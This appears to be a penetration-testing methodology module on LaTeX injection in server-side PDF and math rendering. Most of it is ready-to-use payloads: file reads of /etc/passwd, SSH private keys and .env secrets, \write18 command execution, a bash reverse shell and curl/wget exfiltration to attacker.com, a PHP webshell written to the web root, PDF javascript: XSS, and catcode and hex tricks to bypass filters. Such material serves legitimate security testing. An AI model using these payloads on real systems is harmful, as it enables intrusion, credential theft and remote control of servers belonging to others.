# VULN MODULE — LaTeX Injection
# Asset: webapp
# CWE-94 | Report prefix: WEB-LATEX

## THREAT MODEL

LaTeX injection occurs when user-controlled input is embedded into a LaTeX document
processed server-side (PDF generation, math rendering). Impact ranges from local file
read to RCE depending on shell escape configuration.

Attack surface:
- PDF report generators accepting LaTeX/math input
- Invoice / certificate / academic document builders
- Math rendering endpoints (equation editors)
- Any form field rendered inside a LaTeX template

## VULNERABILITY CLASSES

1. Local File Read      CWE-22   — \input, \lstinputlisting, \verbatiminput
2. RCE via shell-escape CWE-78  — \write18 / --shell-escape enabled
3. File Write           CWE-73   — \immediate\write to arbitrary paths
4. XSS via PDF          CWE-79   — \url{javascript:} rendered in-browser PDF viewer
5. MathJax XSS          CWE-79   — \unicode{} payload in client-side rendering

## WHITEBOX PATTERNS

```bash
# LaTeX engine invocations
grep -rn "pdflatex\|xelatex\|lualatex\|latex\|tectonic" \
  --include="*.py" --include="*.rb" --include="*.js" --include="*.php" --include="*.sh"

# Shell escape enabled (RCE prerequisite)
grep -rn "shell-escape\|shell_escape\|enable-write18\|--enable-pipes" \
  --include="*.py" --include="*.rb" --include="*.js" --include="*.php" --include="*.sh"
# Present = RCE possible via \write18

# User input flowing into LaTeX template
grep -rn "render\|template\|latex\|tex" --include="*.py" --include="*.rb" -A5 | \
  grep -i "request\.\|params\[\|user_input\|input\["

# MathJax server-side rendering
grep -rn "mathjax\|MathJax\|katex\|KaTeX" --include="*.js" --include="*.ts" --include="*.py"
```

## FILE READ PAYLOADS

```latex
% Read /etc/passwd (inline — content appears in PDF body)
\input{/etc/passwd}

% Read with lstinputlisting (syntax-highlighted, more reliable for binary/special chars)
\lstinputlisting{/etc/passwd}

% Read with verbatim (no interpretation of special chars in file)
\verbatiminput{/etc/passwd}

% Read SSH private key
\input{/home/user/.ssh/id_rsa}

% Read app config / secrets
\input{/var/www/html/.env}
\input{/app/config/database.yml}
\input{/etc/nginx/nginx.conf}

% Relative path (when working directory is known)
\input{../../etc/passwd}
```

## RCE PAYLOADS (shell-escape required)

```latex
% Basic command execution — output appears in PDF
\immediate\write18{id > /tmp/out.txt}
\input{/tmp/out.txt}

% One-liner: execute + read back
\immediate\write18{id | tee /tmp/rce.txt}
\verbatiminput{/tmp/rce.txt}

% Reverse shell
\immediate\write18{bash -i >& /dev/tcp/attacker.com/4444 0>&1}

% Exfiltrate via HTTP
\immediate\write18{curl -d @/etc/passwd http://attacker.com/collect}
\immediate\write18{wget --post-file=/etc/passwd http://attacker.com/collect}

% Older syntax (TeX primitives)
\write18{id}
```

## FILE WRITE PAYLOAD

```latex
% Write a PHP webshell to web root
\newwrite\outfile
\openout\outfile=/var/www/html/shell.php
\write\outfile{<?php system($_GET['cmd']); ?>}
\closeout\outfile
```

## XSS VIA PDF VIEWER

```latex
% Rendered as clickable link in PDF — executes in browser PDF viewer
\url{javascript:alert(document.domain)}

% With hyperref package
\href{javascript:alert(1)}{click}

% LaTeX annotations
\pdfstringdef\mystring{javascript:alert(1)}
```

## FILTER BYPASS TECHNIQUES

### catcode manipulation (redefine special chars)
```latex
% Redefine backslash to another char to avoid WAF blocking \write
\catcode`\X=0 % X now acts as backslash
Xwrite18{id}

% Hex encoding of commands
\immediate\write18{\string^^69\string^^64}  % 'id' in ^^hex
```

### Comment and whitespace insertion
```latex
% Insert % comments between command chars (ignored by LaTeX parser)
\imm%
ediate\write%
18{id}
```

### Octal / ^^hex encoding
```latex
% Bypass keyword filter on "write18"
\immediate\^^77rite18{id}    % ^^77 = 'w'
```

## DETECTION — INITIAL PROBES

Start with benign math to confirm LaTeX execution:
```
$\frac{1}{2}$           → should render as fraction
$7 \times 7 = 49$       → confirm arithmetic
```

Then probe for injection:
```
\newline                → if it creates a line break → injection confirmed
\textbf{test}           → if text appears bold → injection confirmed
\input{/etc/hostname}   → file read attempt
```

Any error message containing `.tex`, line numbers, or LaTeX engine names confirms
server-side LaTeX processing.

## TOOLS

```bash
# No dedicated scanner — manual testing + Burp intercept
# Useful for output analysis:
pdftotext output.pdf -   # extract text from generated PDF

# Check if shell-escape is enabled by testing benign command first:
# Inject: \immediate\write18{echo LAtexrce > /tmp/laTexRce123.txt}
# Then: \input{/tmp/laTexRce123.txt}
# If "LATEXRCE" appears in PDF → RCE confirmed
```
